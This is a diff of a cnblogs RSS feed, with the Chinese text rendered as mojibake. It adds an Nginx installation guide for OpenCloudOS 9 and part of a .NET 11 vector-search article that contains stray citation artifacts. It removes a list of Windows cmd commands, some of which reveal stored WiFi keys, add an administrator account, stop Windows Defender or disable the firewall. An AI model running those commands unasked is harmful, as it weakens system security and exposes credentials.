@@ -3,12 +3,247 @@
     <channel>
         <title><![CDATA[ ä¸»é¡µ - åå®¢å­ ]]></title>
         <link><![CDATA[ https://www.cnblogs.com/ ]]></link>
-        <lastBuildDate>2026-05-16T09:27:12.839Z</lastBuildDate>
+        <lastBuildDate>2026-05-16T13:11:05.504Z</lastBuildDate>
         <description><![CDATA[
         ä¸»é¡µ - åå®¢å­ RSS
     ]]></description>
         <language>zh-cn</language>
         <item>
+    <title><![CDATA[ äºãOpenCloudOS Server 9 ç³»ç» å®è£ Nginx ]]></title>
+    <link>https://www.cnblogs.com/yike-318601898-/p/20060731</link>
+    <guid>878478642fc5995db02adb63872406c5</guid>
+    <description>
+    <![CDATA[ 
+		<h1 class="postTitle">
+			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/yike-318601898-/p/20060731" title="åå¸äº 2026-05-16 19:15">
+    <span role="heading" aria-level="2">äºãOpenCloudOS Server 9 ç³»ç» å®è£ Nginx</span>
+    
+
+</a>
+
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="opencloudos-server-9-å®è£-nginx-å®æ´æå">OpenCloudOS Server 9 å®è£ Nginx å®æ´æå</h1>
+<blockquote>
+<p>å®è£ç®å½ï¼<code>/usr/local/nginx</code>ï¼éç½® systemd èªå¨å¯å¨ï¼éè¿ IP è®¿é® index.html</p>
+</blockquote>
+<hr>
+<h2 id="å®è£æµç¨æ¦è§">å®è£æµç¨æ¦è§</h2>
+<pre><code>å®è£ä¾èµ â ä¸è½½æºç  â ç¼è¯å®è£ â åå»º systemd æå¡ â éç½®é²ç«å¢ â éªè¯è®¿é®
+</code></pre>
+<hr>
+<h2 id="ç¬¬ä¸æ­¥å®è£ç¼è¯ä¾èµ">ç¬¬ä¸æ­¥ï¼å®è£ç¼è¯ä¾èµ</h2>
+<pre><code class="language-bash">dnf install -y gcc gcc-c++ make pcre pcre-devel zlib zlib-devel openssl openssl-devel wget
+</code></pre>
+<hr>
+<h2 id="ç¬¬äºæ­¥ä¸è½½-nginx-æºç ">ç¬¬äºæ­¥ï¼ä¸è½½ Nginx æºç </h2>
+<pre><code class="language-bash">cd /usr/local/src
+wget http://nginx.org/download/nginx-1.26.2.tar.gz
+tar -zxvf nginx-1.26.2.tar.gz
+cd nginx-1.26.2
+</code></pre>
+<blockquote>
+<p>å¦éææ°ç¨³å®çï¼å¯å° <a href="http://nginx.org/download" target="_blank" rel="noopener nofollow">nginx.org/download</a> æ¥ççæ¬å·å¹¶æ¿æ¢ä¸æ¹é¾æ¥ã</p>
+</blockquote>
+<hr>
+<h2 id="ç¬¬ä¸æ­¥ç¼è¯å¹¶å®è£å°-usrlocalnginx">ç¬¬ä¸æ­¥ï¼ç¼è¯å¹¶å®è£å° /usr/local/nginx</h2>
+<pre><code class="language-bash">./configure \
+  --prefix=/usr/local/nginx \
+  --with-http_ssl_module \
+  --with-http_v2_module \
+  --with-http_gzip_static_module
+
+make -j$(nproc)
+make install
+</code></pre>
+<p>å®è£å®æåç®å½ç»æï¼</p>
+<table>
+<thead>
+<tr>
+<th>è·¯å¾</th>
+<th>è¯´æ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/local/nginx/sbin/nginx</code></td>
+<td>å¯æ§è¡æä»¶</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/conf/nginx.conf</code></td>
+<td>ä¸»éç½®æä»¶</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/html/</code></td>
+<td>ç½ç«æ ¹ç®å½</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/logs/</code></td>
+<td>æ¥å¿ç®å½</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="ç¬¬åæ­¥åå»º-systemd-æå¡ååèªå¨å¯å¨">ç¬¬åæ­¥ï¼åå»º systemd æå¡ååï¼èªå¨å¯å¨ï¼</h2>
+<pre><code class="language-bash">cat &gt; /etc/systemd/system/nginx.service &lt;&lt; 'EOF'
+[Unit]
+Description=Nginx HTTP Server
+After=network.target
+
+[Service]
+Type=forking
+PIDFile=/usr/local/nginx/logs/nginx.pid
+ExecStartPre=/usr/local/nginx/sbin/nginx -t
+ExecStart=/usr/local/nginx/sbin/nginx
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s QUIT $MAINPID
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
+EOF
+</code></pre>
+<p><strong>å è½½å¹¶å¯ç¨èªå¨å¯å¨ï¼</strong></p>
+<pre><code class="language-bash"># éè½½ systemd éç½®
+systemctl daemon-reload
+
+# å¯å¨ Nginx
+systemctl start nginx
+
+# è®¾ç½®å¼æºèªå¨å¯å¨
+systemctl enable nginx
+
+# æ¥çè¿è¡ç¶æ
+systemctl status nginx
+</code></pre>
+<hr>
+<h2 id="ç¬¬äºæ­¥éç½®é²ç«å¢æ¾è¡-80-ç«¯å£">ç¬¬äºæ­¥ï¼éç½®é²ç«å¢æ¾è¡ 80 ç«¯å£</h2>
+<pre><code class="language-bash"># æ¾è¡ HTTP 80 ç«¯å£
+firewall-cmd --permanent --add-service=http
+
+# å¦æåæ¶éè¦ HTTPS 443
+firewall-cmd --permanent --add-service=https
+
+# éè½½é²ç«å¢è§å
+firewall-cmd --reload
+
+# ç¡®è®¤è§åçæ
+firewall-cmd --list-all
+</code></pre>
+<hr>
+<h2 id="ç¬¬å­æ­¥éªè¯-indexhtml-é¡µé¢">ç¬¬å­æ­¥ï¼éªè¯ index.html é¡µé¢</h2>
+<p>Nginx é»è®¤å·²å¨ <code>/usr/local/nginx/html/index.html</code> çææ¬¢è¿é¡µé¢ï¼å¯ç´æ¥éè¿ IP è®¿é®ï¼æèªå®ä¹åå®¹ï¼</p>
+<pre><code class="language-bash"># æ¥çé»è®¤ index.html
+cat /usr/local/nginx/html/index.html
+
+# èªå®ä¹é¦é¡µï¼å¯éï¼
+cat &gt; /usr/local/nginx/html/index.html &lt;&lt; 'EOF'
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;My Server&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;Nginx è¿è¡æ­£å¸¸&lt;/h1&gt;
+  &lt;p&gt;OpenCloudOS 9 + Nginx /usr/local/nginx&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF
+</code></pre>
+<p>æµè§å¨è®¿é®ï¼</p>
+<pre><code>http://ä½ çæå¡å¨IP
+</code></pre>
+<hr>
+<h2 id="å¸¸ç¨ç®¡çå½ä»¤æ±æ»">å¸¸ç¨ç®¡çå½ä»¤æ±æ»</h2>
+<table>
+<thead>
+<tr>
+<th>æä½</th>
+<th>å½ä»¤</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>å¯å¨</td>
+<td><code>systemctl start nginx</code></td>
+</tr>
+<tr>
+<td>åæ­¢</td>
+<td><code>systemctl stop nginx</code></td>
+</tr>
+<tr>
+<td>éå¯</td>
+<td><code>systemctl restart nginx</code></td>
+</tr>
+<tr>
+<td>éè½½éç½®</td>
+<td><code>systemctl reload nginx</code></td>
+</tr>
+<tr>
+<td>æ¥çç¶æ</td>
+<td><code>systemctl status nginx</code></td>
+</tr>
+<tr>
+<td>æµè¯éç½®è¯­æ³</td>
+<td><code>/usr/local/nginx/sbin/nginx -t</code></td>
+</tr>
+<tr>
+<td>æ¥ççæ¬</td>
+<td><code>/usr/local/nginx/sbin/nginx -v</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="å³é®è·¯å¾ä¸è§">å³é®è·¯å¾ä¸è§</h2>
+<table>
+<thead>
+<tr>
+<th>è·¯å¾</th>
+<th>è¯´æ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/local/nginx/sbin/nginx</code></td>
+<td>å¯æ§è¡æä»¶</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/conf/nginx.conf</code></td>
+<td>ä¸»éç½®æä»¶</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/html/</code></td>
+<td>ç½ç«æ ¹ç®å½</td>
+</tr>
+<tr>
+<td><code>/usr/local/nginx/logs/</code></td>
+<td>æ¥å¿ç®å½</td>
+</tr>
+<tr>
+<td><code>/etc/systemd/system/nginx.service</code></td>
+<td>æå¡ååæä»¶</td>
+</tr>
+</tbody>
+</table>
+
+
+</div>
+<div class="clear"></div>
+
+		</div>
+		<div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 19:15">2026-05-16 19:15</span>&nbsp;
+<a href="https://www.cnblogs.com/yike-318601898-">yikes_ygr</a>&nbsp;
+éè¯»(<span id="post_view_count">19</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20060731);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fyike-318601898-%2Fp%2F20060731&amp;targetId=20060731&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+	 ]]>
+    </description>
+    </item>
+<item>
     <title><![CDATA[ Vibe Codingæå¤å¼ºï¼æåªè±äºä¸å¤©ï¼å°±æåºäºè¿ä¸ªé¶è¡å¼æ·è¡æ¥è¯¢ç½ç«ï¼ ]]></title>
     <link>https://www.cnblogs.com/bigbrid/p/20059960</link>
     <guid>7054cdb943b25ca0bdf9248fa9bad057</guid>
@@ -24,7 +259,7 @@
     <small>
 <span id="post-date" data-last-update-days="0.001388888888888889" data-date-updated="2026-05-16 16:47">2026-05-16 16:45</span>&nbsp;
 <a href="https://www.cnblogs.com/bigbrid">taozsay</a>&nbsp;
-éè¯»(<span id="post_view_count">14</span>)&nbsp;
+éè¯»(<span id="post_view_count">98</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20059960);return false;">æ¶è</a>&nbsp;
@@ -84,124 +319,6 @@
         <vc:categories-tags blog-app="bigbrid" blog-id="134825" post-id="20059960"></vc:categories-tags>
     </ul>
  ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ 100æ¡cmdå½ä»¤å¤§å¨ ]]></title>
-    <link>https://www.cnblogs.com/zhaoauau/p/20059869</link>
-    <guid>6616e2b29fc168d44ed7f5e8851f744b</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zhaoauau/p/20059869" title="åå¸äº 2026-05-16 16:26">
-    <span role="heading" aria-level="2">100æ¡cmdå½ä»¤å¤§å¨</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
-<p data-track="1">1.systeminfo:æ¾ç¤ºç³»ç»è¯¦ç»ä¿¡æ¯(å®è£æ¥æ/è¡¥ä¸/åå­ç­)</p>
-<p data-track="17">2.sfc/scannow:æ«æå¹¶ä¿®å¤ç³»ç»æä»¶æå[ç®¡çå]</p>
-<p data-track="2">3.chkdsk/f:æ£æ¥ç£çéè¯¯å¹¶ä¿®å¤(ééå¯)[ç®¡çå]</p>
-<p data-track="3">4.cleanmgr:å¯å¨ç£çæ¸çå·¥å·</p>
-<p data-track="4">5.defrag C:/0:ä¼åæºæ¢°ç¡¬çç¢ç(SSDæ éä½¿ç¨)</p>
-<p data-track="5">6.msinfo32:æå¼ç³»ç»ä¿¡æ¯é¢æ¿</p>
-<p data-track="6">7.winver:æ¾ç¤ºWindowsçæ¬</p>
-<p data-track="7">8.services.msc:æå¡ç®¡çæ§å¶å°</p>
-<p data-track="8">9.compmgmt.msc:è®¡ç®æºç»¼åç®¡ç</p>
-<p data-track="9">10.diskmgmt.msc:ç£çååºç®¡ç</p>
-<p data-track="10">11.devmgmt.msc:è®¾å¤ç®¡çå¨</p>
-<p data-track="11">12.eventvwr:äºä»¶æ¥çå¨</p>
-<p data-track="12">13.perfmon:æ§è½çè§å¨</p>
-<p data-track="13">14.taskschd.msc:ä»»å¡è®¡åç¨åº</p>
-<p data-track="14">15.lusrmgr.msc:æ¬å°ç¨æ·åç»ç®¡ç</p>
-<p data-track="15">16.control:æå¼æ§å¶é¢æ¿</p>
-<p data-track="16">17.appwiz.cpl:ç¨åºååè½é¢æ¿</p>
-<p data-track="18">18.sysdm.cpl:ç³»ç»å±æ§è®¾ç½®</p>
-<p data-track="19">19.secpol.msc:æ¬å°å®å¨ç­ç¥</p>
-<p data-track="20">20.rs0p.msc:ç»ç­ç¥ç»æé</p>
-<p data-track="21">31.ipconfig/all:æ¾ç¤ºå®æ´ç½ç»éç½®</p>
-<p data-track="22">32.ping8.8.8.8-t:æç»­æµè¯ç½ç»è¿éæ§</p>
-<p data-track="23">33.tracert www.baidu.com:è·¯ç±è¿½è¸ª</p>
-<p data-track="24">34.netstat-ano:æ¥çææç½ç»è¿æ¥</p>
-<p data-track="25">35.nslookup www.qq.com:DNSè§£æéªè¯</p>
-<p data-track="26">36.arp-a:æ¾ç¤ºARPç¼å­è¡¨</p>
-<p data-track="27">37. netsh interface ip show config:æ¾ç¤ºç½å¡éç½®</p>
-<p data-track="27">38.netsh interface ip set dns "ä»¥å¤ªç½" static 8.8.8.8:è®¾ç½®éæDNS</p>
-<p data-track="28">39.netshwinsockreset:éç½®ç½ç»åè®®æ </p>
-<p data-track="29">40.netsh advfirewall set allprofiles state off:ä¸´æ¶å³é­é²ç«å¢</p>
-<p data-track="31">41.route print:æ¥çè·¯ç±è¡¨</p>
-<p data-track="32">42.net use K:\192.168.1.100\share:æ å°ç½ç»é©±å¨å¨</p>
-<p data-track="33">43. netsh wlan show profiles:æ¥çä¿å­çWiFiéç½®</p>
-<p data-track="81">44. netsh wlan show profile name="Home" key=clear: æ¥çWiFiå¯ç </p>
-<p data-track="34">45.netsh wlan connect ssid="Office":è¿æ¥æå®WiFi</p>
-<p data-track="82">46.pathpingwww.taobao.com:ç»¼åè·¯ç±åä¸¢åæµè¯</p>
-<p data-track="35">47.getmac/v:æ¾ç¤ºMACå°åè¯¦æ</p>
-<p data-track="36">48.netview:æ¥çå±åç½å±äº«èµæº</p>
-<p data-track="37">49.netshare:ç®¡çå±äº«æä»¶å¤¹</p>
-<p data-track="38">50.ftp:å¯å¨FTPå®¢æ·ç«¯</p>
-<p data-track="39">56.dir/s/ah:éå½æ¾ç¤ºç®å½åéèæä»¶</p>
-<p data-track="40">57.cd/d D:\logs:è·¨çç¬¦åæ¢ç®å½</p>
-<p data-track="41">58.robocopy C:\src D:\backup/MIR/MT:8:å¤çº¿ç¨éåå¤ä»½</p>
-<p data-track="42">59.*del/F/Q.tmp:å¼ºå¶å é¤ä¸´æ¶æä»¶</p>
-<p data-track="43">60.rd/S/Q"D:\old":æ æç¤ºå é¤éç©ºç®å½</p>
-<p data-track="44">61.fsutil file createnew test.txt 1048576:çæ1MBæµè¯æä»¶</p>
-<p data-track="83">62.type filename.txt:æ¾ç¤ºææ¬æä»¶åå®¹</p>
-<p data-track="45">63.copy file1.txt+file2.txt merged.txt:åå¹¶æä»¶</p>
-<p data-track="46">64.xcopy C:\data D:\backup /E/H/C:å¤å¶ç®å½æ </p>
-<p data-track="84">65.move file.txt D:\newfolder:ç§»å¨æä»¶</p>
-<p data-track="47">66.ren old.txt new.txt:éå½åæä»¶</p>
-<p data-track="48">67.attrib+h secret.txt:è®¾ç½®éèå±æ§</p>
-<p data-track="49">68.fc file1.txt file2.txt:æä»¶åå®¹æ¯è¾</p>
-<p data-track="50">69.find"error"log.txt:æä»¶ä¸­æç´¢å­ç¬¦ä¸²</p>
-<p data-track="51">70.tree/F:æ¾ç¤ºç®å½æ ç»æ</p>
-<p data-track="52">71.md newfolder:åå»ºæ°ç®å½</p>
-<p data-track="53">72.cipher/W:D::å½»åºæ¦é¤ç£çå©ä½ç©ºé´</p>
-<p data-track="54">73.compact/c/s:å¯ç¨NTFSåç¼©</p>
-<p data-track="55">74.diskpart:å¯å¨ç£çååºå·¥å·</p>
-<p data-track="56">75.formatE:/FS:NTFS/Q:å¿«éæ ¼å¼åç£ç</p>
-<p data-track="57">76.tasklist/svc:æ¥çè¿ç¨åå³èæå¡</p>
-<p data-track="58">77.taskkill/F/IMchrome.exe:å¼ºå¶ç»æè¿ç¨</p>
-<p data-track="59">78.taskkill/PID1234/T:ç»æè¿ç¨æ </p>
-<p data-track="60">79.startnotepad:å¯å¨åºç¨ç¨åº</p>
-<p data-track="61">80. net user Tech P@sswOrd /add:åå»ºç¨æ·</p>
-<p class="syl-line-pure-english" data-track="62">81. net localgroup administrators Tech /add</p>
-<p data-track="63">83.query session:æ¥çè¿ç¨æ¡é¢ä¼è¯</p>
-<p data-track="64">84.whoami:æ¾ç¤ºå½åç¨æ·</p>
-<p data-track="65">85.runas /user:admin cmd:ä»¥å¶ä»ç¨æ·èº«ä»½è¿è¡</p>
-<p data-track="85">86.qwinsta:æ¾ç¤ºç»ç«¯æå¡ä¼è¯(åquery session)</p>
-<p data-track="66">87.sc query:æ¥çæå¡ç¶æ</p>
-<p data-track="67">88.sc stop WinDefend:åæ­¢æå¡</p>
-<p data-track="68">89. sc config DiagTrack start= disabled:ç¦ç¨æå¡</p>
-<p data-track="86">90.wmic process get name,processid:è·åè¿ç¨åè¡¨</p>
-<p data-track="74">91. for /L %i in (1,1,100) do ping -n 1 192.168.1.%i: éPingæ«æ</p>
-<p data-track="69">92. **forfiles /p "C:\logs" /s /m *.log /d -7/c "cmd /c del@path"**:èªå¨æ¸çæ¥å¿</p>
-<p data-track="70">93. auditpol /set /category:"Account Logon"/success:enable:å¯ç¨ç»å½å®¡æ ¸</p>
-<p data-track="71">94. wmic product get name,version&gt; software.csv: å¯¼åºè½¯ä»¶æ¸å</p>
-<p data-track="72">95. wmic memorychip get capacity,speed: è·ååå­ä¿¡æ¯</p>
-<p data-track="73">96. wmic diskdrive get model,size:è·åç¡¬çä¿¡æ¯</p>
-<p data-track="75">97. reg query"HKLM\Software\Microsoft\Windows\CurrentVersion\Run":æ¥çå¯å¨é¡¹</p>
-<p data-track="78">98.schtasks/query/fo LIST/v:æ¥çè®¡åä»»å¡è¯¦æ</p>
-<p data-track="79">99.vssadminlist shadows:æ¥çå·å½±å¯æ¬</p>
-<p data-track="80">100.powercfg/batteryreport:çæçµæ± å¥åº·æ¥å</p>
-
-</div>
-<div class="clear"></div>
-
-            </div>
-            <div class="postDesc">posted @ 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 16:27">2026-05-16 16:26</span>&nbsp;
-<a href="https://www.cnblogs.com/zhaoauau">zhao_auau</a>&nbsp;
-éè¯»(<span id="post_view_count">0</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(20059869);return false;">æ¶è</a>&nbsp;
-<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fzhaoauau%2Fp%2F20059869&amp;targetId=20059869&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
-</div>
-         ]]>
     </description>
     </item>
 <item>
@@ -333,7 +450,7 @@ hey -n 50 -c 6 http://192.168.2.67
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0.02847222222222222" data-date-updated="2026-05-16 16:27">2026-05-16 15:46</span>&nbsp;
 <a href="https://www.cnblogs.com/juziyu">æ¡å­é¨</a>&nbsp;
-éè¯»(<span id="post_view_count">32</span>)&nbsp;
+éè¯»(<span id="post_view_count">68</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20059639);return false;">æ¶è</a>&nbsp;
@@ -409,7 +526,7 @@ res </span>= llm.invoke(prompt_value, config=<span style="color: rgba(0, 0, 0, 1
             <div class="postDesc">posted @ 
 <span id="post-date" data-last-update-days="0" data-date-updated="2026-05-16 06:55">2026-05-16 06:54</span>&nbsp;
 <a href="https://www.cnblogs.com/halfcode">èéè¯´ç¼ç¨</a>&nbsp;
-éè¯»(<span id="post_view_count">34</span>)&nbsp;
+éè¯»(<span id="post_view_count">57</span>)&nbsp;
 è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(20050097);return false;">æ¶è</a>&nbsp;
@@ -1166,6 +1283,321 @@ createDataEventsForTable(snapshotContext, snapshotReceiver, table);
     </description>
     </item>
 <item>
+    <title><![CDATA[ AI å¼åçé£ï¼.NET 11 Preview 4 åçéæåéæç´¢ + MCP æ¨¡æ¿ï¼EF Core ç´æ¥å¯¹æ  RAG åºç¨ ]]></title>
+    <link>https://www.cnblogs.com/shenchuanchao/p/20060331/dotnet-11-preview-4-vector-search-mcp-template-ef-core-rag</link>
+    <guid>840cfa0570c1afcf99cca81cd51b8d06</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/shenchuanchao/p/20060331/dotnet-11-preview-4-vector-search-mcp-template-ef-core-rag" title="åå¸äº 2026-05-16 17:44">
+    <span role="heading" aria-level="2">AI å¼åçé£ï¼.NET 11 Preview 4 åçéæåéæç´¢ + MCP æ¨¡æ¿ï¼EF Core ç´æ¥å¯¹æ  RAG åºç¨</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        æ¬ææè¿°äº .NET 11 Preview 4 å¨ AI åºç¨å¼åä¸çéè¦æ´æ°ãSDK æ°å¢äºåç½®ç MCP Server æ¨¡æ¿ï¼ç®åäº AI å·¥å·çå¼åæµç¨ãåæ¶ï¼EF Core çåéæç´¢è½åå¾å°å¢å¼ºï¼ä¸ºå¨ .NET ä¸­æå»ºæ£ç´¢å¢å¼ºçæï¼RAGï¼ åºç¨æä¾äºæ´å®åçæ¯æãè¿äºæ°ç¹æ§è¿ä¸æ­¥éä½äº .NET å¼åèå° AI è½åéæå°åºç¨ä¸­çé¨æ§ã
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<p>å¤§å®¶å¥½ï¼ææ¯ç ååå­ã</p>
+<blockquote>
+<p>å¾®è½¯å®æ¹å¨ .NET 11 Preview 4 åå¸å¬åä¸­ç´è¨ï¼âåéæç´¢æ¯åç AI å¼åçæ ¸å¿æä»¶ä¹ä¸ãâå½è¯­ä¹æç´¢éä¸æ åå AI å·¥å·è°ç¨åè®®ï¼.NET ä»é«æ§è½æ¡æ¶å AI åçå¼åå¹³å°çå³é®ä¸æ­¥ï¼æ­£å¼è½å°ã</p>
+</blockquote>
+<h2 id="section">å¼è¨</h2>
+<p>2026 å¹´ 5 æ 12 æ¥ï¼å¾®è½¯åå¸äº .NET 11 çç¬¬åä¸ªé¢è§çãå¨è¿è¡æ¶å¼æ­¥æ¨¡ååè¿ç¨ API çå¤§å¹æ´æ°ä¹å¤ï¼æä¸ä¸ªæ¹åå¯¹ .NET å¼åèèè¨æä¹å°¤ä¸ºæ·±è¿ââ<strong>ASP.NET Core ç AI éæå EF Core çåéæç´¢ï¼æ­£å¨å° .NET æé æçæ­£é¢å AI å·¥ä½è´è½½çå¼åå¹³å°</strong>ã</p>
+<p>éçå¤§è¯­è¨æ¨¡åå RAGï¼æ£ç´¢å¢å¼ºçæï¼åºç¨å¨ä¼ä¸åºæ¯ä¸­çè¿éæ®åï¼å¼åèé¢ä¸´çä¸¤ä¸ªæ ¸å¿ææï¼</p>
+<ol>
+<li><strong>å¦ä½é«æå°è¿è¡è¯­ä¹æ£ç´¢ï¼</strong> ä¼ ç»çå¨ææç´¢æ æ³çè§£ç¨æ·çæå¾åä¸ä¸æï¼èåéç¸ä¼¼æ§æç´¢æ­£å¨æä¸º AI åºç¨çåºç¡è®¾æ½ã</li>
+<li><strong>å¦ä½è®© AI æ¨¡åå®å¨ãæ ååå°è°ç¨ç°æ APIï¼</strong> æ¯ä¸ª AI åºç¨é½éè¦è®©å¤§è¯­è¨æ¨¡åä¸å¤é¨ç³»ç»äº¤äºï¼ä½åå®¶åè®®äºè±å«é¨ã</li>
+</ol>
+<p>. NET 11 Preview 4 ç»åºçç­æ¡æ¯ï¼<strong>ç¨ EF Core + SQL Server 2025 çåçåéæ¯æè§£å³è¯­ä¹æ£ç´¢é®é¢ï¼ç¨ MCPï¼Model Context Protocolï¼Server æ¨¡æ¿è§£å³ AI å·¥å·è°ç¨æ ååé®é¢</strong>ã</p>
+<p>æ¬æå°ä»è¿ä¸¤ä¸ªæ¹ååºåï¼åæ .NET 11 Preview 4 å¨ AI å¼åæ¹é¢çéå¤§è¿å±ï¼å¹¶éè¿å®éæ¡ä¾å±ç¤ºå¦ä½ç»åäºèæå»ºçæ­£ç RAG åºç¨ã</p>
+<h2 id="ef-core-rag.net">ä¸ãEF Core åéæç´¢ï¼å° RAG æ ¸å¿è½åç´æ¥å¸¦å¥ .NET çæ</h2>
+<h3 id="ai">1.1 ä»ä¹æ¯åéæç´¢ï¼ä¸ºä»ä¹å®å³ä¹ AI å¼åçæªæ¥ï¼</h3>
+<p>å¨ä¸ä¸ªæ åç RAG åºç¨ä¸­ï¼ç¨æ·æé®åï¼ç³»ç»éè¦å¨ç¥è¯åºä¸­æ£ç´¢æç¸å³çåå®¹ä½ä¸ºä¸ä¸æï¼åç±å¤§æ¨¡åçæç­æ¡ãä¼ ç»çæ£ç´¢æ¹å¼ä¾èµå³é®è¯å¹éï¼æ æ³çè§£âç¨æ·å¯è½æ³ç¥éä»ä¹âã</p>
+<p>åéæç´¢çè§£å³æ¹æ¡æ¯æææ¬è½¬åä¸ºåµå¥ï¼embeddingï¼ââé«ç»´æ°å¼åéï¼ç¶åå¨åéç©ºé´ä¸­éè¿è·ç¦»è®¡ç®ï¼å¦ä½å¼¦ç¸ä¼¼åº¦ï¼æ¾å°è¯­ä¹ç¸è¿çåå®¹ãå½ç¨æ·é®âå¦ä½éç½®å¯ç âæ¶ï¼åéæç´¢è½æ¾å°ææ¡£ä¸­æè¿°âå¿è®°ç»å½å­è¯âçåå®¹ï¼å³ä¾¿åæä¸­æ²¡æâå¯ç âäºå­ã</p>
+<p>å¾®è½¯å®æ¹ææ¡£å¯¹æ­¤çå®ä¹æ¯ï¼âSQL Server åéæ°æ®ç±»ååè®¸å­å¨åµå¥ï¼è¿äºåµå¥æ¯æä¹çæ°å¼è¡¨ç¤ºï¼å¯ä»¥é«æå°è¿è¡ç¸ä¼¼æ§æç´¢ï¼ä¸ºè¯­ä¹æç´¢åæ£ç´¢å¢å¼ºçæï¼RAGï¼ç­ AI å·¥ä½è´è½½æä¾æ¯æãâ</p>
+<h3 id="ef-core">1.2 EF Core çåéè¿åæ¶é´çº¿</h3>
+<p>EF Core å¯¹åéçæ¯æå¹¶éä¸è¹´èå°±ï¼èæ¯ç»è¿äºå®æ´çæ¼è¿ï¼</p>
+<table>
+<thead>
+<tr><th>çæ¬</th><th>åéæ¯æç¶æ</th><th>è¯´æ</th><th>&nbsp;</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>EF Core 9</strong></td>
+<td>å®éªæ§æ¯æï¼éæ©å±åï¼</td>
+<td>éè¿ <code>EFCore.SqlServer.VectorSearch</code> æ©å±åå®ç°äºè¿å¶åéä¼ è¾ [11â L15-L24]</td>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td><strong>EF Core 10</strong></td>
+<td>åçæ¯æï¼èª .NET 10ï¼</td>
+<td>åç½® <code>SqlVector&lt;T&gt;</code> ç±»åå <code>EF.Functions.VectorDistance()</code> å½æ° [8â L10-L14][18â L12-L15]</td>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td>&nbsp;</td>
+<td><strong>.NET 11 Preview 4</strong></td>
+<td>æç»­å¢å¼º</td>
+<td>åéæç´¢è½åè¿ä¸æ­¥æçï¼éå Preview 4 çæ´ä½ AI çæåçº§ [7â L13-L14]</td>
+</tr>
+</tbody>
+</table>
+<p>è¿æå³çï¼å¨ .NET 10/11 æ¶ä»£å¯å¨æ°é¡¹ç®çå¼åèï¼æ éå®è£é¢å¤æ©å±å³å¯ç´æ¥ä½¿ç¨åéåè½ã</p>
+<h3 id="section-1">1.3 å®éä»£ç ï¼ä»æ¨¡åå®ä¹å°ç¸ä¼¼æ§æ¥è¯¢</h3>
+<p><strong>ç¬¬ä¸æ­¥ï¼å®ä¹åå«åéçå®ä½æ¨¡å</strong></p>
+<p>å¨ EF Core 11 ä¸­ï¼åéå­æ®µå¯ä»¥éè¿ <code>SqlVector&lt;float&gt;</code> ç±»åè½»æ¾å®ä¹ï¼</p>
+<pre><code class="language-csharp">public class Document
+{
+    public int Id { get; set; }
+    public string Title { get; set; }
+    public string Content { get; set; }
+    
+    [Column(TypeName = "vector(1536)")]  // 1536ç»´ï¼OpenAI ada-002çæ åç»´åº¦
+    public SqlVector&lt;float&gt; Embedding { get; set; }
+}
+</code></pre>
+<p><strong>ç¬¬äºæ­¥ï¼çæå¹¶å­å¨åµå¥</strong></p>
+<p>åµå¥ççæéè¿ <code>Microsoft.Extensions.AI</code> åºä¸­ç <code>IEmbeddingGenerator</code> æ½è±¡å®æï¼è¿ä¸å¾®è½¯æ­£å¨æ¨è¿çç»ä¸ AI æ½è±¡å±ä¿æä¸è´ã</p>
+<pre><code class="language-csharp">using Microsoft.Extensions.AI;
+
